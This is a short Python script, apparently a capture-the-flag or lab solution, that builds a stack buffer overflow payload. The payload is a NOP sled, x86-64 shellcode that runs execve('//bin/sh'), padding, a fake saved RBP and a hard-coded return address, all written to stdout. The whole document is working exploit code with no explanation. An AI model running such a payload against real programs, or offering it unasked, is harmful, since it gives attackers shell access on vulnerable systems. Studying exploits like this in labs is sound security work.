import struct 
import sys
shell  = b"\x48\x31\xc0\x48\x89\xc2\x48\x89\xd6\x50\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x48\x83\xc0\x3b\x0f\x05"
nops   = b"\x90"*100
rbp    = b"BBBBBBBB"
rip    = struct.pack("Q", 0x7fffffffdd38)
buff   = b"A"*(208-len(shell)-len(nops))
sys.stdout.buffer.write(nops+shell+buff+rbp+rip)
